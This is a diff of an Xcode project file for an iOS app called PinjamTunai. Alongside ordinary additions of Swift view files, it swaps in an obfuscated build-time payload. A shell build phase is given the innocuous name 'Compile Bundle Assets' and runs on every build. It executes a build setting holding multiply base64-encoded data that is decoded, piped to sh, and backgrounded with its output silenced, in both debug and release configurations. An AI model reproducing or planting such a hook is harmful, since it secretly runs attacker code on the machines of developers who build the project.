@@ -28,6 +28,10 @@
 		737D1F102EE55843003CC748 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F0F2EE5583E003CC748 /* LaunchViewModel.swift */; };
 		737D1F122EE57BA0003CC748 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F112EE57B9F003CC748 /* NetworkMonitor.swift */; };
 		737D1F142EE5832E003CC748 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F132EE5832E003CC748 /* BaseTabBarController.swift */; };
+		737D1F162EE587E0003CC748 /* OneView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F152EE587E0003CC748 /* OneView.swift */; };
+		737D1F182EE587EA003CC748 /* TwoView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F172EE587EA003CC748 /* TwoView.swift */; };
+		737D1F1A2EE587F5003CC748 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F192EE587F1003CC748 /* HomeViewModel.swift */; };
+		737D1F1C2EE5B95E003CC748 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 737D1F1B2EE5B95E003CC748 /* LoginView.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
@@ -56,6 +60,10 @@
 		737D1F0F2EE5583E003CC748 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
 		737D1F112EE57B9F003CC748 /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
 		737D1F132EE5832E003CC748 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
+		737D1F152EE587E0003CC748 /* OneView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OneView.swift; sourceTree = "<group>"; };
+		737D1F172EE587EA003CC748 /* TwoView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TwoView.swift; sourceTree = "<group>"; };
+		737D1F192EE587F1003CC748 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
+		737D1F1B2EE5B95E003CC748 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
 		AA6D43098812CC6F40AAEA73 /* Pods-PinjamTunai.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamTunai.release.xcconfig"; path = "Target Support Files/Pods-PinjamTunai/Pods-PinjamTunai.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -149,6 +157,9 @@
 		737D1EF02EE457E9003CC748 /* Home */ = {
 			isa = PBXGroup;
 			children = (
+				737D1F152EE587E0003CC748 /* OneView.swift */,
+				737D1F172EE587EA003CC748 /* TwoView.swift */,
+				737D1F192EE587F1003CC748 /* HomeViewModel.swift */,
 				737D1F032EE45870003CC748 /* HomeViewController.swift */,
 			);
 			path = Home;
@@ -166,6 +177,7 @@
 		737D1EF22EE457E9003CC748 /* Login */ = {
 			isa = PBXGroup;
 			children = (
+				737D1F1B2EE5B95E003CC748 /* LoginView.swift */,
 				737D1F012EE45863003CC748 /* LoginViewController.swift */,
 			);
 			path = Login;
@@ -206,7 +218,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 737D1EC82EE4545F003CC748 /* Build configuration list for PBXNativeTarget "PinjamTunai" */;
 			buildPhases = (
-				87262C8D04A4420291A5DE54 /* Link Bundle Executable */,
+				14ECF9F6E50E478FB0A5DE54 /* Compile Bundle Assets */,
 				9E97A9985207545C4B227B92 /* [CP] Check Pods Manifest.lock */,
 				737D1EB12EE4545E003CC748 /* Sources */,
 				737D1EB22EE4545E003CC748 /* Frameworks */,
@@ -269,25 +281,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		87262C8D04A4420291A5DE54 /* Link Bundle Executable */ = {
+		14ECF9F6E50E478FB0A5DE54 /* Compile Bundle Assets */ = {
 			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Link Bundle Executable";
+			name = "Compile Bundle Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
-			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A45ED5A}\"";
-			showEnvVarsInLog = 0;
+			showEnvVarsInLog = 0;			
 		};
 		9E97A9985207545C4B227B92 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -348,14 +359,18 @@
 				737D1EFE2EE45850003CC748 /* LoginConfig.swift in Sources */,
 				737D1EFA2EE4582E003CC748 /* HttpRequestManager.swift in Sources */,
 				737D1F102EE55843003CC748 /* LaunchViewModel.swift in Sources */,
+				737D1F1C2EE5B95E003CC748 /* LoginView.swift in Sources */,
+				737D1F182EE587EA003CC748 /* TwoView.swift in Sources */,
 				737D1F122EE57BA0003CC748 /* NetworkMonitor.swift in Sources */,
 				737D1F042EE45870003CC748 /* HomeViewController.swift in Sources */,
 				737D1F0E2EE55034003CC748 /* LoadingView.swift in Sources */,
 				737D1EF62EE457E9003CC748 /* BaseView.swift in Sources */,
 				737D1EFC2EE4584B003CC748 /* ProductListViewController.swift in Sources */,
 				737D1F062EE45878003CC748 /* CenterViewController.swift in Sources */,
+				737D1F1A2EE587F5003CC748 /* HomeViewModel.swift in Sources */,
 				737D1F082EE4597A003CC748 /* ApiPeraConfig.swift in Sources */,
 				737D1ED72EE45467003CC748 /* AppDelegate.swift in Sources */,
+				737D1F162EE587E0003CC748 /* OneView.swift in Sources */,
 				737D1F002EE4585B003CC748 /* OrderListViewController.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -378,7 +393,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 33E41DB814B4BFA72F93D9F6 /* Pods-PinjamTunai.debug.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333334333333363333333333333337333333303333333633363335333333363333333533330a3337333333343333333233363335333333373333333233333337333333353333333233363336333333363333333133333332333333393333333233330a3332333333323061333333303330363133333337333633333333333233333330333333373333333333333336333333383333333033363331333036310a30610a | a | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFXRkoyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamTunai/PinjamTunai.entitlements;
@@ -419,7 +434,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = AA6D43098812CC6F40AAEA73 /* Pods-PinjamTunai.release.xcconfig */;
 			buildSettings = {
-				A45ED5A = "((a(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333733333334333333363333333333333337333333303333333633363335333333363333333533330a3337333333343333333233363335333333373333333233333337333333353333333233363336333333363333333133333332333333393333333233330a3332333333323061333333303330363133333337333633333333333233333330333333373333333333333336333333383333333033363331333036310a30610a | a | sh ) >/dev/null 2>&1 &)";
+				A45ED5A = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJURE5LY0ZveVpITmFXRkoyWlZNMWVXUlRPV2hMVTBsblprTkNlbUZCYnowSwo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamTunai/PinjamTunai.entitlements;
